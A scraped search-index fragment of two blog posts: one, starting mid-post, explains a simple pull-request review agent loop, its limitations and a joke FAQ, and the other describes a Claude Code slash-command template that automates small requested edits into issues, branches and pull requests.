results:</p> <ul> <li>Definite approval via the <code>submit_review</code> tool that approves the changes with a summary of the changes made to the code.</li> <li>Definite rejection via the <code>submit_review</code> tool that rejects the changes with a summary of the reason why they're being rejected.</li> <li>Comments without approving or rejecting the code.</li> </ul> <p>The core of reviewbot is the \"AI agent loop\", or a loop that works like this:</p> <ul> <li>Collect information to feed into the AI model</li> <li>Submit information to AI model</li> <li>If the AI model runs the <code>submit_review</code> tool, publish the results and exit.</li> <li>If the AI model runs any other tool, collect the information it's requesting and add it to the list of things to submit to the AI model in the next loop.</li> <li>If the AI model just returns text at any point, treat that as a noncommittal comment about the changes.</li> </ul>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#dont-use-reviewbot","title":"Don't use reviewbot","text":"<p>reviewbot is a hack that probably works well enough for me. It has a number of limitations including but not limited to:</p> <ul> <li>It does not work with closed source repositories due to the gitfs library not supporting cloning repositories that require authentication. Could probably fix that with some elbow grease if I'm paid enough to do so.</li> <li>A fair number of test invocations had the agent rely on unpopulated fields from the GitHub API, which caused crashes. I am certain that I will only find more such examples and need to issue patches for them.</li> <li>reviewbot is like 300 lines of Go hacked up by hand in an afternoon. If you really need something like this, you can likely write one yourself with little effort.</li> </ul>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#frequently-asked-questions","title":"Frequently asked questions","text":"<p>When such an innovation as reviewbot comes to pass, people naturally have questions. In order to give you the best reading experience, I asked my friends, patrons, and loved ones for their questions about reviewbot. Here are some answers that may or may not help:</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#does-the-world-really-need-another-ai-agent","title":"Does the world really need another AI agent?","text":"<p>Probably not! This is something I made out of curiosity, not something I made for you to actually use. It was a lot easier to make than I expected and is surprisingly useful for how little effort was put into it.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#is-there-a-theme-of-faq-questions-that-youre-looking-for","title":"Is there a theme of FAQ questions that you're looking for?","text":"<p>Nope. Pure chaos. Let it all happen in a glorious way.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#where-do-we-go-when-we-die","title":"Where do we go when we die?","text":"<p>How the fuck should I know? I don't even know if chairs exist.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#has-anyone-ever-really-been-far-even-as-decided-to-use-even-go-want-to-do-look-more-like","title":"Has anyone ever really been far even as decided to use even go want to do look more like?","text":"<p>At least half as much I have wanted to use go wish for that. It's just common sense, really.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#if-you-have-a-pile-of-sand-and-take-away-one-grain-at-a-time-when-does-it-stop-being-a-pile","title":"If you have a pile of sand and take away one grain at a time, when does it stop being a pile?","text":"<p>When the wind can blow all the sand away.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#how-often-does-it-require-oatmeal","title":"How often does it require oatmeal?","text":"<p>Three times daily or the netherbeast will emerge and doom all of society. We don't really want that to happen so we make sure to feed reviewbot its oatmeal.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#how-many-pancakes-does-it-take-to-shingle-a-dog-house","title":"How many pancakes does it take to shingle a dog house?","text":"<p>At least twelve. Not sure because I ran out of pancakes.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#will-this-crush-my-enemies-have-them-fall-at-my-feet-their-horses-and-goods-taken","title":"Will this crush my enemies, have them fall at my feet, their horses and goods taken?","text":"<p>Only if you add that functionality in a pull request. reviewbot can do anything as long as its code is extended to do that thing.</p>"},{"location":"xeiaso.net/I%20made%20a%20simple%20agent%20for%20PR%20reviews.%20Don%27t%20use%20it_20260205/#why-should-i-use-reviewbot","title":"Why should I use reviewbot?","text":"<p>Frankly, you shouldn't.</p>"},{"location":"xeiaso.net/Tormentmaxxing%20%27simple%20requests%27_20260205/","title":"Tormentmaxxing 'simple requests'","text":"<p>\u6765\u6e90: https://xeiaso.net \u94fe\u63a5: https://xeiaso.net/notes/2026/tormentmaxxing-simple-requests/ \u65e5\u671f: Thu, 15 Jan 2026 00:00:00 GMT</p> <p>I don't like being interrupted when I'm deep in flow working on things. When my flow is interrupted, it can feel like my focus was violently stolen from me and the mental context that was crystalline falls apart into a thousand pieces before it is lost forever. With this in mind, being asked to do a \"quick\" 5 minute task can actually result in over an hour of getting back up to speed.</p> <p>This means that I sometimes will agree to do things, go back into flow (because if I get back into flow almost instantly I'm more likely to not lose any context), forget about them, and then look bad as a result. This is not ideal for employment uptime.</p> <p>When you work at a startup, you don't do your job; you project the perception of doing it and ensure that the people above you are happy with what you are doing. This is a weird fundamental conflict and understanding this at a deep level has caused a lot of strange thoughts about the nature of the late-stage capitalism that we find ourselves in.</p>"},{"location":"xeiaso.net/Tormentmaxxing%20%27simple%20requests%27_20260205/#tormentmaxxing-it","title":"Tormentmaxxing it","text":"<p>However, it's the future and we have tools like Claude Code. As much as I am horrified by the massive abuses the AI industry is doing to the masses with abusive scraping, there are real things that the tools the AI industry can do today. The biggest thing they can do is just implement those \"quick requests\" because most of them are on the line of:</p> <ul> <li>Delete this paragraph from the readme please.</li> <li>This thing is confusing, can you reword or remove it?</li> <li>You forgot to xyz.</li> </ul> <p>Nearly 90% of these are in fact things that tools the AI industry has released can do today. I could just open an AI coding agent and tell it to go to town, but we can do better.</p> <p>Claude Code has custom slash command support. In Claude Code land, slash commands are prompt templates that you can hydrate with arguments. This means you can just describe the normal workflow process and have the agent dutifully go about and get that done for you while you focus on more important things.</p> <p>Here's what those commands look like in practice:</p> <p>Please make the following change:</p> <p>$ARGUMENTS</p> <p>When you are done, do the following:</p> <ul> <li>Create a Linear issue for this task.</li> <li>Create a branch based on the changes to be made and my github username (eg: <code>ty/update-readme-not-mention-foo</code>).</li> <li>Make a commit with the footer <code>Closes: (linear issue ID)</code> and use the <code>--signoff</code> flag.</li> <li>Push that branch to GitHub.</li> <li>Create a pull request for that branch.</li> <li>Make a comment on that pull request mentioning <code>${CEO_GITHUB_USERNAME}</code>. </li> </ul> <p>When all that is done, please reply with a message similar to the following:</p> <p>Got it, please review this PR when you can: (link).</p> <p>So whenever I get a \"quick request\", I can open a new worktree in something like Conductor, copy that Slack message verbatim, then type in:</p> <p>/quick-request add a subsection to the README pointing people to the Python repository (link) based on the subsections for Go and JavaScript</p> <p>From there all I have to do is hit enter and then go back to writing. The agent will dutifully Just Solve The Thing\u2122\ufe0f using GLM 4.7 via their coding plan. It's not as good as Anthropic's models, but it works well enough and has a generous rate limit. It's good enough, and good enough is good enough for me.</p> <p>I realize the fundamental conflict between what I work on with Anubis and this tormentmaxxing workflow, but if these tools are going to exist regardless of what I think is \"right\", is decently cheap, and is genuinely useful, I may as well take advantage of this while the gravy train lasts.</p> <p>Remember: think smarter, not harder.</p>"}]}